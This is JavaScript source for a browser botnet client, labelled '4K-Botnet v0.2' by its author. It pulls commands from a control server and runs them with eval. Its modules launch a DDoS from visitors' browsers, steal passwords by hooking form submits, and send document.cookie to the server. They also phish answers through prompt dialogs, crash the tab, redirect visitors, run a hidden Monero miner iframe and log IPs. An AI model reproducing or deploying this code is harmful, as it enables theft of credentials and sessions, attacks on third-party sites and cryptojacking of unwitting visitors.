//4K-Botnet v0.2 by Chowix40
//I know it's crap but it works (Kinda)
var SERVER_URL = 'http://example.com/Botnet/'

function getCMD() {
var oReqcmd = new XMLHttpRequest();    
oReqcmd.addEventListener("load", reqListener);
oReqcmd.open("GET", SERVER_URL+"cmds.php");
oReqcmd.send(null);

function reqListener() {
eval(oReqcmd.responseText)
}
}

//Get and Execute CMDs
getCMD()

//Functions

//1) DDos
function DDoS() { 
//Gets the URL to DDoS
var oReq = new XMLHttpRequest();    
oReq.addEventListener("load", reqListener);
oReq.open("GET", SERVER_URL+"url.php");
oReq.send(null);
    
function reqListener() {
setInterval(DDosX, 10);
}
    
//Original DDoS code taken from the Cloudflare blog - https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos/
function DDosX() {  
    
  var TARGET = oReq.responseText
  var URI = '/index.php?page=index.html'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}    
} //Done-ish, Attack Untested, Needs optimization

//2) credJacker
function getCreds() {
//Original code taken from Gumshoe but modified by Chowix40 
   var forms = document.getElementsByTagName('form');

    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var fields = form.getElementsByTagName('input');

      // attempt to locate user/pass elements
      for (var j = 0; j < fields.length; j++) {
          var f = fields[j];

          // recognize user/pass form elements
          if (!form._pass && f.type == 'password')
              form._pass = f;
          else if (!form._user && (f.type == 'text' || f.type == 'email'))
              form._user = f;

          // wait until user/pass are found
          if (!(form._user !== undefined && form._pass !== undefined))
              continue;

          // user/pass elements found
          // add event handler to form
          form.onsubmit = function() {
              if (this._user.value && this._pass.value) {
                  // post credentials to background
                var userName = this._user.value
                var passWord = this._pass.value
                var pic = new Image()
                pic.src = SERVER_URL+'creds.php?user='+userName+'&pass='+passWord
              }
                  }};
              }
        }; //Done

//3) cookieJacker
function getCookies() {
//Code taken from http://hackiteasy.blogspot.com/2011/01/session-hijacking-or-cookie-stealing.html
var pic = new Image()
pic.src = SERVER_URL+'cookielogger.php?cookie='+document.cookie
} //Done 

//4) injectHeader
function injectHeader() {
    d=document;e=d.createElement("h1");e.innerHTML=arguments[0];d.body.appendChild(e)
} //It works, but Needs work, it inserts header at bottom of page- need to get it on the top, might remove in the future

//5) promptUser
function promptUser() {
    var promptAnswer = prompt(arguments[0]);
    var pic = new Image()
    pic.src = SERVER_URL+'prompt.php?answer='+promptAnswer
} //Done

//6) deathTab
function browserKill() {
    while(true) {
    var total = '';
    for (var i = 0; i < 100000; i++) {total = total + i.toString()}
    history.pushState(0,0, total );
};
} //Done

//7) reDire
function reDire() {
    window.location.replace(arguments[0])
} //Done

//8) N/A

//9) MoneroMiner
function moneyMaker() {
    document.write("<iframe src=" + SERVER_URL + "mine.html width=0 height=0 hidden></iframe>")
};

//10) IP Stealer
function ipLog(argument) {
  var pic = new Image()
  pic.src = SERVER_URL+'ip.php'
};

//11) ???
